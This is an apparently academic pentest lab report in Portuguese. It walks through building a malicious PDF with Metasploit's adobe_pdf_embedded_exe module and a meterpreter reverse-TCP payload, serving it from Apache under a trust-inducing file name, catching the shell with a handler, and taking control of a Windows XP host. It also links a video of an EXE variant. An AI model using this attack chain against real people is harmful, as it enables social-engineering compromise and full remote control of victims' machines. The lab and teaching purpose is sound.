<h1 style="border-bottom: 2px solid #333; padding-bottom: 10px;">RELATÓRIO TÉCNICO INTEGRADO: ANÁLISE DE VULNERABILIDADES</h1>

<p><strong>DOCUMENTO DE NÍVEL CONFIDENCIAL</strong><br>
<strong>Data da Operação:</strong> 19 de Novembro de 2025<br>
<strong>Responsáveis Técnicos:</strong> Yuri Alexander e Gabriel Machado<br>
<strong>Ambiente:</strong> Laboratório de Pentest (Virtualizado)</p>

<hr style="border: 0; border-top: 2px solid #000; margin: 30px 0;">

<h2 style="background-color: #333; color: #fff; padding: 10px;">TRABALHO 1: VERSÃO ARQUIVO.PDF (DOCUMENTAÇÃO TÉCNICA)</h2>

<h3>1.1. RESUMO DO CENÁRIO (PDF)</h3>
<p>A primeira etapa da operação consistiu na criação de um vetor de ataque baseado em documento ("Client-Side Attack"). O objetivo foi embutir um código malicioso dentro de um arquivo PDF legítimo para exploração via Engenharia Social, aproveitando a funcionalidade de anexo de executáveis do Adobe Reader 9.3.</p>

<ul>
    <li><strong>Vetor de Ataque:</strong> Metasploit Framework (Módulo: <code>adobe_pdf_embedded_exe</code>)</li>
    <li><strong>Infraestrutura de Entrega:</strong> Apache Web Server (Kali Linux)</li>
    <li><strong>Arquivo Gerado:</strong> <code>ArquivoConfiavel.pdf</code></li>
</ul>

<h3>1.2. EXECUÇÃO TÉCNICA DETALHADA</h3>

<h4>Fase 1: Configuração do Exploit</h4>
<p>Os analistas iniciaram o console do Metasploit e selecionaram o módulo responsável por gerar o arquivo PDF malicioso.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe</code>
</pre>

<h4>Fase 2: Definição do Payload e Rede</h4>
<p>Configuração do código de conexão reversa (Reverse TCP) e definição do nome do arquivo para aumentar a credibilidade.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(...) > set LHOST 192.168.20.2
msf exploit(...) > set LPORT 4444
msf exploit(...) > set INFILENAME ArquivoConfiavel.pdf</code>
</pre>

<blockquote style="background-color:#eee; padding:10px; border-left: 5px solid #555;">
<strong>NOTA DE TROUBLESHOOTING (REDE):</strong><br>
Durante a configuração, a equipe identificou através da interface de rede ("Wired Connection 1") que o IP padrão estava incorreto. Foi necessário ajustar manualmente o parâmetro <code>LHOST</code> para <code>192.168.20.2</code> e regerar o exploit para garantir que a vítima conectasse no endereço certo.
</blockquote>

<p><strong>Geração do Artefato:</strong></p>
<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf exploit(...) > exploit
# [+] Arquivo gerado: /root/.msf4/local/ArquivoConfiavel.pdf</code>
</pre>

<h4>Fase 3: Configuração do Servidor Web (Apache)</h4>
<p>Para simular um download realista, o arquivo foi transferido para o servidor web da máquina atacante. Esta etapa é crítica para a entrega (Delivery).</p>

<p><strong>1. Inicialização do Serviço:</strong></p>
<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code># service apache2 start
# service apache2 status</code>
</pre>

<p><strong>2. Publicação do Arquivo:</strong></p>
<p>O arquivo foi copiado do diretório oculto do Metasploit para a raiz do servidor web (<code>/var/www/html/</code>).</p>
<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code># cp /root/.msf4/local/ArquivoConfiavel.pdf /var/www/html/</code>
</pre>

<h4>Fase 4: Configuração da Escuta (Listener)</h4>
<p>Preparação do servidor atacante para receber a conexão na porta 4444 quando a vítima abrir o PDF.</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.2
msf exploit(handler) > exploit</code>
</pre>

<h4>Fase 5: Pós-Exploração (Comprometimento)</h4>
<p>A vítima acessou <code>http://192.168.20.2/ArquivoConfiavel.pdf</code> e executou o arquivo. A sessão foi estabelecida:</p>

<pre style="background-color:#f4f4f4; padding:10px; border:1px solid #ddd;">
<code>meterpreter > screenshot
meterpreter > shell
C:\Documents and Settings\Administrator\Desktop></code>
</pre>

<br>
<hr style="border: 0; border-top: 2px solid #000; margin: 30px 0;">
<br>

<h2 style="background-color: #333; color: #fff; padding: 10px;">TRABALHO 2: VERSÃO ARQUIVO.EXE (EVIDÊNCIA EM VÍDEO)</h2>

<h3>2.1. OBJETIVO DA DEMONSTRAÇÃO</h3>
<p>Esta seção apresenta a Prova de Conceito (PoC) visual, focada na execução direta do binário malicioso (payload .EXE) e na validação da conexão reversa em tempo real.</p>

<h3>2.2. REGISTRO VISUAL DA OPERAÇÃO</h3>

<div align="center" style="margin-bottom: 20px; background-color: #f9f9f9; padding: 15px; border: 1px solid #ccc;">
    <p><strong>CLIQUE NA IMAGEM ABAIXO PARA ASSISTIR À DEMONSTRAÇÃO:</strong></p>
    <a href="https://youtu.be/lntV_v_hTH0" target="_blank">
        <img src="https://img.youtube.com/vi/lntV_v_hTH0/hqdefault.jpg" 
             alt="Assistir Vídeo no YouTube" 
             style="width:100%; max-width:600px; border: 2px solid #333; box-shadow: 0 0 10px rgba(0,0,0,0.3);">
    </a>
    <p style="margin-top:10px;">🔴 <strong><a href="https://youtu.be/lntV_v_hTH0">Link direto para o YouTube</a></strong></p>
</div>

<p><i>Backup do arquivo local (video.mp4):</i></p>
<div style="background-color:#000; text-align:center; padding:10px;">
    <video width="100%" height="auto" controls>
        <source src="video.mp4" type="video/mp4">
        Seu navegador não suporta a tag de vídeo.
    </video>
</div>

<h3>2.3. ANÁLISE DO VÍDEO</h3>
<p>O vídeo documenta os seguintes eventos críticos:</p>
<ol>
    <li><strong>Preparação:</strong> Verificação final do IP (192.168.20.2) e geração do executável.</li>
    <li><strong>Execução:</strong> A vítima executa o arquivo manualmente na estação Windows XP.</li>
    <li><strong>Conexão:</strong> O console do Kali Linux confirma a abertura da <code>Meterpreter session 1</code> instantaneamente.</li>
    <li><strong>Controle:</strong> Demonstração de controle total sobre o sistema operacional alvo.</li>
</ol>

<hr>

<h3>3. CONCLUSÃO GERAL</h3>
<p>Os procedimentos realizados validam a vulnerabilidade crítica no ambiente. A combinação da entrega via servidor web (Apache) com a engenharia social (PDF/EXE) provou ser eficaz para contornar as defesas do usuário e do sistema operacional legado.</p>
